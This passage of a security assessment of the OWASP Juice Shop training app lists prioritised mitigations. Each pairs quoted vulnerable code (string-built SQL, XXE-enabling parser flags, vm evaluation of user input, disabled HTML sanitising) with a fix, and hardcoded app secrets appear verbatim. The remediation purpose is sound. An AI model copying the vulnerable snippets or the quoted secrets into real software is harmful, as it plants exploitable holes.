**Current state:** `libxml.parseXml(data, { noblanks: true, noent: true, nocdata: true })` — `noent: true` explicitly enables external entity resolution.

**Violated Requirements:** [IV-002](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html) — XXE prevention required

→ **Mitigation:** [M-005 — Disable external entity resolution in libxmljs2](#m-005)

---

## 10. Mitigation Register

Prioritized measures to address identified threats. Each mitigation references the threats it addresses and includes concrete implementation guidance.

### <a id="m-001"></a>M-001 · Replace Hardcoded Secrets with Environment-Injected Secrets

**Addresses:** [T-001](#t-001), [T-028](#t-028)
**Fulfills Requirements:** [DP-005](https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html) — Secrets in secret manager
**Priority:** <span style="background:#b91c1c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Critical</span> | **Effort:** Medium

**Why:** The hardcoded RSA private key in source code gives any repository reader the ability to forge admin JWT tokens indefinitely. The hardcoded HMAC secret and cookie secret are similarly exposed.

**How:**
1. Generate a new 2048-bit RSA key pair: `openssl genrsa -out jwt_private.pem 2048 && openssl rsa -in jwt_private.pem -pubout -out jwt_public.pem`
2. Store `jwt_private.pem` in a secrets manager (Vault, AWS Secrets Manager, GitHub Encrypted Secret `JWT_PRIVATE_KEY`)
3. Inject as environment variable at container startup: `JWT_PRIVATE_KEY_PATH=/run/secrets/jwt_private`
4. Replace hardcoded strings in [lib/insecurity.ts:24](vscode://file/home/mrohr/juice-shop/lib/insecurity.ts:24):

```typescript
// BEFORE (lib/insecurity.ts:24)
const privateKey = '-----BEGIN RSA PRIVATE KEY-----\r\nMIICXAI...'

// AFTER
import fs from 'node:fs'
const privateKey = process.env.JWT_PRIVATE_KEY
  || (process.env.JWT_PRIVATE_KEY_PATH
      ? fs.readFileSync(process.env.JWT_PRIVATE_KEY_PATH, 'utf8')
      : (() => { throw new Error('JWT_PRIVATE_KEY not configured') })())
```

5. Similarly replace HMAC secret (`'pa4qacea4VK9t9nGv7yZtwmj'`) with `process.env.HMAC_SECRET`
6. Replace cookie secret (`'kekse'`) with `process.env.COOKIE_SECRET`
7. Rotate all issued JWT tokens after deployment (change key invalidates all existing tokens)

**Reference:** [OWASP Secrets Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html)

---

### <a id="m-002"></a>M-002 · Parameterize All SQL Queries

**Addresses:** [T-002](#t-002), [T-003](#t-003)
**Fulfills Requirements:** [IV-004](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html) — SQL parameterization
**Priority:** <span style="background:#b91c1c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Critical</span> | **Effort:** Low

**Why:** Both the login and search endpoints build SQL queries via string interpolation, enabling authentication bypass and full database extraction with a single request.

**How:**
1. Replace raw `sequelize.query()` with parameterized equivalents in [routes/login.ts:34](vscode://file/home/mrohr/juice-shop/routes/login.ts:34):

```typescript
// BEFORE (routes/login.ts:34)
models.sequelize.query(`SELECT * FROM Users WHERE email = '${req.body.email || ''}' AND password = '${security.hash(req.body.password || '')}' AND deletedAt IS NULL`, ...)

// AFTER — use Sequelize ORM findOne with where clause
const user = await UserModel.findOne({
  where: {
    email: req.body.email || '',
    password: security.hash(req.body.password || ''),
    deletedAt: null
  }
})
```

2. Replace raw query in [routes/search.ts:23](vscode://file/home/mrohr/juice-shop/routes/search.ts:23):

```typescript
// BEFORE (routes/search.ts:23)
models.sequelize.query(`SELECT * FROM Products WHERE ((name LIKE '%${criteria}%' OR description LIKE '%${criteria}%') AND deletedAt IS NULL) ORDER BY name`)

// AFTER — parameterized with Op.like
const products = await ProductModel.findAll({
  where: {
    [Op.and]: [
      { deletedAt: null },
      {
        [Op.or]: [
          { name: { [Op.like]: `%${criteria}%` } },
          { description: { [Op.like]: `%${criteria}%` } }
        ]
      }
    ]
  },
  order: [['name', 'ASC']]
})
```

**Reference:** [CWE-89](https://cwe.mitre.org/data/definitions/89.html)

---

### <a id="m-003"></a>M-003 · Replace MD5 with bcrypt or argon2 for Password Hashing

**Addresses:** [T-004](#t-004)
**Fulfills Requirements:** [DP-004](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html) — Secure password storage
**Priority:** <span style="background:#b91c1c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Critical</span> | **Effort:** Low

**Why:** MD5 is a message digest algorithm, not a password hashing function. It has no salt, no cost factor, and a 10-billion-hashes/second GPU attack rate. A full database dump is crackable in hours.

**How:**
1. Install bcrypt: `npm install bcrypt @types/bcrypt`
2. Update password setter in [models/user.ts:70](vscode://file/home/mrohr/juice-shop/models/user.ts:70):

```typescript
// BEFORE (models/user.ts:70)
set (clearTextPassword: string) {
  this.setDataValue('password', security.hash(clearTextPassword))
}

// AFTER
import bcrypt from 'bcrypt'
const SALT_ROUNDS = 12
set (clearTextPassword: string) {
  this.setDataValue('password', bcrypt.hashSync(clearTextPassword, SALT_ROUNDS))
}
```

3. Update login comparison in [routes/login.ts](vscode://file/home/mrohr/juice-shop/routes/login.ts) to use `bcrypt.compare(inputPassword, storedHash)`
4. Migrate existing MD5 hashes: on next login, if `hash.length === 32` (MD5), re-hash with bcrypt and update the record

**Reference:** [OWASP Password Storage Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html)

---

### <a id="m-004"></a>M-004 · Remove vm.runInContext Evaluation of User Input

**Addresses:** [T-005](#t-005)
**Priority:** <span style="background:#b91c1c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Critical</span> | **Effort:** Medium

**Why:** Node.js `vm` module is not a security sandbox. Sandbox escape to arbitrary code execution is well-documented. Evaluating user-supplied strings is never safe regardless of sandboxing.

**How:**
1. In [routes/b2bOrder.ts](vscode://file/home/mrohr/juice-shop/routes/b2bOrder.ts), remove the `vm.runInContext` block entirely
2. Replace with a strict JSON schema validator for the expected order structure:

```typescript
// AFTER — validate order structure with JSON Schema instead of eval
import Ajv from 'ajv'
const ajv = new Ajv()
const orderSchema = {
  type: 'object',
  properties: {
    cid: { type: 'string', maxLength: 50 },
    orderLinesData: {
      type: 'array',
      items: {
        type: 'object',
        properties: {
          productId: { type: 'integer' },
          quantity: { type: 'integer', minimum: 1, maximum: 999 }
        },
        required: ['productId', 'quantity'],
        additionalProperties: false
      }
    }
  },
  required: ['orderLinesData'],
  additionalProperties: false
}
const validate = ajv.compile(orderSchema)
if (!validate(body)) {
  return res.status(400).json({ error: 'Invalid order format' })
}
```

**Reference:** [CWE-94](https://cwe.mitre.org/data/definitions/94.html)

---

### <a id="m-005"></a>M-005 · Disable External Entity Resolution in libxmljs2

**Addresses:** [T-006](#t-006)
**Fulfills Requirements:** [IV-002](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html) — XXE prevention
**Priority:** <span style="background:#b91c1c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Critical</span> | **Effort:** Low

**Why:** `noent: true` explicitly tells the parser to resolve `&entity;` references including `SYSTEM` URIs pointing to local files or network resources.

**How:**

```typescript
// BEFORE (routes/fileUpload.ts:75)
const xmlDoc = vm.runInContext('libxml.parseXml(data, { noblanks: true, noent: true, nocdata: true })', sandbox, ...)

// AFTER
const xmlDoc = vm.runInContext('libxml.parseXml(data, { noblanks: true, noent: false, nocdata: true, nonet: true })', sandbox, ...)
```

Additionally, consider using a safer XML parser (e.g., `fast-xml-parser` with `allowBooleanAttributes: false`) instead of libxmljs2, which has had multiple CVEs.

**Reference:** [OWASP XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)

---

### <a id="m-006"></a>M-006 · Remove bypassSecurityTrustHtml and Use Angular Safe Binding

**Addresses:** [T-007](#t-007), [T-008](#t-008)
**Fulfills Requirements:** [WEB-007](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) — XSS prevention, [WEB-004](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html) — CSP
**Priority:** <span style="background:#ea580c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">High</span> | **Effort:** Medium

**Why:** `bypassSecurityTrustHtml` disables Angular's built-in HTML sanitizer for the marked value. When combined with `[innerHTML]`, any HTML including `<script>` tags renders without restriction.

**How:**
1. For each affected component, remove `sanitizer.bypassSecurityTrustHtml()` and bind as plain text instead:

```typescript
// BEFORE (search-result.component.ts:170)
this.searchValue = this.sanitizer.bypassSecurityTrustHtml(queryParam)

// AFTER — use textContent binding, not innerHTML
this.searchValue = queryParam  // bind with {{ searchValue }} not [innerHTML]
```

2. For cases where HTML rendering is genuinely needed (e.g., feedback display), use DOMPurify after `bypassSecurityTrustHtml`:

```typescript
import DOMPurify from 'dompurify'
feedbacks[i].comment = this.sanitizer.bypassSecurityTrustHtml(
  DOMPurify.sanitize(feedback.comment, { ALLOWED_TAGS: ['b', 'i', 'em', 'strong'] })
)
```

3. Add a global Content-Security-Policy header in [server.ts](vscode://file/home/mrohr/juice-shop/server.ts):

```typescript
app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'"],
    styleSrc: ["'self'", "'unsafe-inline'"],
    imgSrc: ["'self'", "data:", "https:"],
    connectSrc: ["'self'"]
  }
}))
```

**Reference:** [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)

---

### <a id="m-007"></a>M-007 · Restrict Authentication Details Endpoint to Admin Role

**Addresses:** [T-009](#t-009)
**Priority:** <span style="background:#ea580c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">High</span> | **Effort:** Low

**Why:** Any authenticated user can retrieve the full active session token map, enabling session hijacking of all users including administrators.

**How:**

```typescript
// BEFORE (server.ts)
app.get('/rest/user/authentication-details', authenticatedUsers())

// AFTER — restrict to admin role
app.get('/rest/user/authentication-details', security.isAuthorized(), security.isAdmin(), authenticatedUsers())
```

Also consider removing this endpoint entirely in production, or returning only the current user's session rather than all active sessions.

**Reference:** [CWE-200](https://cwe.mitre.org/data/definitions/200.html)

---

### <a id="m-008"></a>M-008 · Implement URL Allowlist to Prevent SSRF

**Addresses:** [T-010](#t-010)
**Priority:** <span style="background:#ea580c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">High</span> | **Effort:** Low

**Why:** Fetching arbitrary attacker-supplied URLs server-side enables access to internal cloud metadata services, localhost ports, and internal network resources.

**How:**

```typescript
// BEFORE (routes/profileImageUrlUpload.ts:27)
const response = await fetch(url)

// AFTER — validate URL before fetching
import { URL } from 'node:url'
function isAllowedImageUrl(rawUrl: string): boolean {
  try {
    const parsed = new URL(rawUrl)
    // Only allow HTTPS, no private IP ranges, no localhost
    if (parsed.protocol !== 'https:') return false
    const hostname = parsed.hostname
    if (/^(localhost|127\.|10\.|172\.(1[6-9]|2\d|3[01])\.|192\.168\.|169\.254\.)/.test(hostname)) return false
    if (/\.(internal|local|corp)$/.test(hostname)) return false
    return true
  } catch { return false }
}
if (!isAllowedImageUrl(url)) {
  return res.status(400).json({ error: 'URL not allowed' })
}
```

**Reference:** [OWASP Server-Side Request Forgery Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)

---

### <a id="m-009"></a>M-009 · Enforce Basket Ownership Check (Fix IDOR)

**Addresses:** [T-011](#t-011)
**Fulfills Requirements:** [AC-006](https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html) — IDOR prevention
**Priority:** <span style="background:#ea580c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">High</span> | **Effort:** Low

**Why:** Any authenticated user can read any other user's basket by guessing the basket ID, exposing pending orders and payment information.

**How:**

```typescript
// BEFORE (routes/basket.ts:18-19)
const id = req.params.id
const basket = await BasketModel.findOne({ where: { id }, include: [...] })

// AFTER — verify ownership
const user = security.authenticatedUsers.from(req)
const basket = await BasketModel.findOne({
  where: { id, UserId: user?.data?.id },  // enforce ownership
  include: [{ model: ProductModel, paranoid: false, as: 'Products' }]
})
if (!basket) return res.status(403).json({ error: 'Forbidden' })
```

**Reference:** [OWASP IDOR Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html)

---

### <a id="m-010"></a>M-010 · Restore Authentication on PUT /api/Products/:id

**Addresses:** [T-012](#t-012)
**Fulfills Requirements:** [AC-002](https://cheatsheetseries.owasp.org/cheatsheets/Access_Control_Cheat_Sheet.html) — RBAC deny-by-default
**Priority:** <span style="background:#ea580c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">High</span> | **Effort:** Low

**Why:** The commented-out middleware allows unauthenticated product modification, enabling price manipulation and store defacement.

**How:**

```typescript
// BEFORE (server.ts:369) — commented out
// app.put('/api/Products/:id', security.isAuthorized())

// AFTER — restore and restrict to admin
app.put('/api/Products/:id', security.isAuthorized(), security.isAdmin())
```

**Reference:** [CWE-306](https://cwe.mitre.org/data/definitions/306.html)

---

### <a id="m-011"></a>M-011 · Replace Wildcard CORS with Explicit Allowlist

**Addresses:** [T-013](#t-013)
**Fulfills Requirements:** [WEB-003](https://cheatsheetseries.owasp.org/cheatsheets/CORS_Security_Cheat_Sheet.html) — CORS allowlist
**Priority:** <span style="background:#ea580c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">High</span> | **Effort:** Low

**How:**

```typescript
// BEFORE (server.ts:181-182)
app.options('*', cors())
app.use(cors())

// AFTER
const allowedOrigins = (process.env.ALLOWED_ORIGINS || 'http://localhost:3000').split(',')
const corsOptions: cors.CorsOptions = {
  origin: (origin, callback) => {
    if (!origin || allowedOrigins.includes(origin)) {
      callback(null, true)
    } else {
      callback(new Error('CORS not allowed'))
    }
  },
  credentials: true
}
app.options('*', cors(corsOptions))
app.use(cors(corsOptions))
```

**Reference:** [OWASP CORS Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/CORS_Security_Cheat_Sheet.html)

---

### <a id="m-012"></a>M-012 · Add HSTS and Global CSP Headers

**Addresses:** [T-014](#t-014)
**Fulfills Requirements:** [WEB-005](https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Strict_Transport_Security_Cheat_Sheet.html) — HSTS, [WEB-004](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html) — CSP
**Priority:** <span style="background:#ea580c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">High</span> | **Effort:** Low

**How:**

```typescript
// Add to server.ts security middleware section
app.use(helmet.hsts({ maxAge: 31536000, includeSubDomains: true, preload: true }))
app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'"],
    styleSrc: ["'self'", "'unsafe-inline'"],
    imgSrc: ["'self'", "data:", "https:"],
    connectSrc: ["'self'"],
    fontSrc: ["'self'"],
    objectSrc: ["'none'"],
    upgradeInsecureRequests: []
  }
}))
```

**Reference:** [OWASP HTTP Headers Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html)

---

### <a id="m-013"></a>M-013 · Prevent Mass Assignment on User Registration

**Addresses:** [T-015](#t-015)
**Priority:** <span style="background:#ea580c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">High</span> | **Effort:** Low

**How:** In the finale-rest resource creation handler ([server.ts:509](vscode://file/home/mrohr/juice-shop/server.ts:509)), strip the `role` field from the request body before persisting:

```typescript
resource.create.send.before((req, res, context) => {
  // Prevent privilege escalation via mass assignment
  delete req.body.role
  delete req.body.totpSecret
  delete req.body.deluxeToken
  return context.continue
})
```

**Reference:** [CWE-915](https://cwe.mitre.org/data/definitions/915.html)

---

### <a id="m-014"></a>M-014 · Move Password Change to POST with Body Parameters

**Addresses:** [T-016](#t-016)
**Fulfills Requirements:** [DP-003](https://cheatsheetseries.owasp.org/cheatsheets/REST_Security_Cheat_Sheet.html) — Sensitive data not in URLs
**Priority:** <span style="background:#ea580c;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">High</span> | **Effort:** Low

**How:** Change [routes/changePassword.ts](vscode://file/home/mrohr/juice-shop/routes/changePassword.ts) to read from `req.body` instead of `req.query`, and update the server route from GET to POST. Also enforce that `currentPassword` is always required when the user has a password set.

**Reference:** [OWASP REST Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/REST_Security_Cheat_Sheet.html)

---

### <a id="m-015"></a>M-015 · Add Rate Limiting to Login Endpoint

**Addresses:** [T-017](#t-017)
**Fulfills Requirements:** [AC-003](https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html) — Rate limiting on all endpoints
**Priority:** <span style="background:#ca8a04;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Medium</span> | **Effort:** Low

**How:**

```typescript
// Add before app.post('/rest/user/login', ...) in server.ts
app.use('/rest/user/login', rateLimit({
  windowMs: 15 * 60 * 1000,  // 15 minutes
  max: 10,                    // 10 attempts per window per IP
  message: 'Too many login attempts, please try again later.',
  standardHeaders: true,
  legacyHeaders: false
}))
```

**Reference:** [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)

---

### <a id="m-016"></a>M-016 · Enforce PKCE and State Validation in OAuth2 Flow

**Addresses:** [T-018](#t-018)
**Priority:** <span style="background:#ca8a04;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Medium</span> | **Effort:** Medium

**Why:** Missing PKCE allows authorization code interception attacks. Missing state validation enables OAuth CSRF.

**How:** Add `state` parameter generation and validation, and enforce `code_challenge` / `code_challenge_method=S256` in the OAuth2 authorization request. Use a library like `openid-client` which handles PKCE and state automatically.

**Reference:** [OWASP OAuth 2.0 Security Best Practices](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)

---

### <a id="m-017"></a>M-017 · Fix Zip Slip Path Traversal in File Upload

**Addresses:** [T-019](#t-019)
**Fulfills Requirements:** [IV-005](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html) — Secure file upload
**Priority:** <span style="background:#ca8a04;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Medium</span> | **Effort:** Low

**How:**

```typescript
// BEFORE (routes/fileUpload.ts:43)
if (absolutePath.includes(path.resolve('.'))) {

// AFTER — use startsWith for prefix check
const targetDir = path.resolve('uploads/complaints')
if (!absolutePath.startsWith(targetDir + path.sep)) {
  entry.autodrain()
  return
}
```

**Reference:** [CWE-22](https://cwe.mitre.org/data/definitions/22.html)

---

### <a id="m-018"></a>M-018 · Protect Logfile and FTP Endpoints

**Addresses:** [T-020](#t-020)
**Priority:** <span style="background:#ca8a04;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Medium</span> | **Effort:** Low

**How:**
1. Add `security.isAuthorized(), security.isAdmin()` middleware to the logfile server route in [server.ts](vscode://file/home/mrohr/juice-shop/server.ts)
2. Remove public `/ftp` directory listing or restrict to admin users
3. Use `path.resolve()` + `.startsWith(targetDir)` for file path validation instead of the `/` character check

**Reference:** [CWE-35](https://cwe.mitre.org/data/definitions/35.html)

---

### <a id="m-019"></a>M-019 · Restrict Sensitive Endpoints to Internal Network

**Addresses:** [T-021](#t-021)
**Fulfills Requirements:** [HN-002](https://cheatsheetseries.owasp.org/cheatsheets/REST_Security_Cheat_Sheet.html) — Management endpoints internal-only
**Priority:** <span style="background:#ca8a04;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Medium</span> | **Effort:** Low

**How:** Add authentication to `/metrics`, `/api-docs`, and `/encryptionkeys/`:

```typescript
// Protect metrics endpoint
app.get('/metrics', security.isAuthorized(), security.isAdmin(), metrics.serveMetrics())

// Protect Swagger UI
app.use('/api-docs', security.isAuthorized(), security.isAdmin(), swaggerUi.serve, swaggerUi.setup(swaggerDocument))

// Protect encryption keys — move to environment variables (see M-001) and remove HTTP serving
// app.use('/encryptionkeys', ...) — remove entirely
```

**Reference:** [OWASP REST Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/REST_Security_Cheat_Sheet.html)

---

### <a id="m-020"></a>M-020 · Limit YAML Parse Scope to Prevent Billion-Laughs DoS

**Addresses:** [T-022](#t-022)
**Priority:** <span style="background:#ca8a04;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Medium</span> | **Effort:** Low

**How:** Replace `yaml.load()` with `yaml.load(data, { schema: yaml.JSON_SCHEMA })` to disable anchors and aliases, or switch to `js-yaml`'s `safeLoad` equivalent and enforce a strict schema.

**Reference:** [CWE-400](https://cwe.mitre.org/data/definitions/400.html)

---

### <a id="m-021"></a>M-021 · Remove $where JavaScript Operator from NeDB Queries

**Addresses:** [T-023](#t-023), [T-024](#t-024)
**Priority:** <span style="background:#ca8a04;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Medium</span> | **Effort:** Low

**How:**

```typescript
// BEFORE (routes/showProductReviews.ts:36)
db.reviewsCollection.find({ $where: 'this.product == ' + id })

// AFTER — use standard NeDB query operator
const numericId = parseInt(id, 10)
if (isNaN(numericId)) return res.status(400).json({ error: 'Invalid product ID' })
db.reviewsCollection.find({ product: numericId })
```

**Reference:** [CWE-943](https://cwe.mitre.org/data/definitions/943.html)

---

### <a id="m-022"></a>M-022 · Add Structured Security Event Logging

**Addresses:** [T-025](#t-025)
**Fulfills Requirements:** [LM-001](https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html) — Security event logging
**Priority:** <span style="background:#ca8a04;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Medium</span> | **Effort:** Medium

**How:** Extend [lib/logger.ts](vscode://file/home/mrohr/juice-shop/lib/logger.ts) with a `securityEvent()` function and call it at authentication and authorization decision points:

```typescript
// lib/logger.ts addition
export function securityEvent(type: string, details: Record<string, unknown>) {
  logger.warn(JSON.stringify({
    timestamp: new Date().toISOString(),
    event: type,
    ...details
  }))
}

// Usage in routes/login.ts — on failure
securityEvent('AUTH_FAILURE', { ip: req.ip, email: req.body.email })
```

**Reference:** [OWASP Logging Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html)

---

### <a id="m-023"></a>M-023 · Pin Remaining GitHub Actions to SHA and Add npm audit to CI

**Addresses:** [T-026](#t-026)
**Fulfills Requirements:** [SC-001](https://owasp.org/www-project-dependency-check/) — SCA in CI, [SC-002](https://owasp.org/www-project-dependency-check/) — Lockfile pinning
**Priority:** <span style="background:#ca8a04;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Medium</span> | **Effort:** Low

**How:**
1. In [.github/workflows/codeql-analysis.yml](vscode://file/home/mrohr/juice-shop/.github/workflows/codeql-analysis.yml), replace `@v3` tags with specific commit SHAs
2. Add to CI pipeline: `npm audit --audit-level=high` with failure on exit code non-zero
3. Use `npm ci` instead of `npm install` to enforce lockfile integrity

**Reference:** [OWASP Dependency Check](https://owasp.org/www-project-dependency-check/)

---

### <a id="m-024"></a>M-024 · Replace Open Redirect Denylist with Allowlist

**Addresses:** [T-027](#t-027)
**Priority:** <span style="background:#16a34a;color:white;padding:1px 6px;border-radius:3px;font-size:0.85em">Low</span> | **Effort:** Low

**How:** In [lib/insecurity.ts](vscode://file/home/mrohr/juice-shop/lib/insecurity.ts) where `redirectAllowlist` is defined, change the matching logic to require an exact prefix match rather than substring containment, and consider removing the redirect endpoint entirely in favor of client-side routing.

**Reference:** [CWE-601](https://cwe.mitre.org/data/definitions/601.html)

---

## 11. Out of Scope

Areas deliberately excluded from this assessment:

1. **Intentional challenge vulnerabilities as bugs** — All 100+ intentional CTF/training vulnerabilities in OWASP Juice Shop are documented here as real security findings since the architecture decisions represent real-world anti-patterns. However, fixing them would defeat the purpose of the training application.
2. **Web3/NFT functionality** — The smart contract interaction and NFT minting features in `routes/web3Wallet.ts` and `routes/nftMint.ts` were not deeply analyzed for blockchain-specific vulnerabilities (reentrancy, integer overflow, etc.).
3. **Third-party npm dependency CVE analysis** — With SCA disabled (`WITH_SCA=false`), individual CVEs in the 71+ direct dependencies were not enumerated. Use `npm audit` for this.
4. **Runtime infrastructure** — No Kubernetes manifests, no cloud provider IAM policies, no network security groups were present to analyze. TLS configuration depends on the upstream load balancer.
5. **Social engineering / phishing** — Out of scope for a code-level security assessment.
6. **Physical security** — Out of scope.
7. **Frontend bundle analysis** — Angular build configuration and bundle integrity (subresource integrity) were not fully audited.
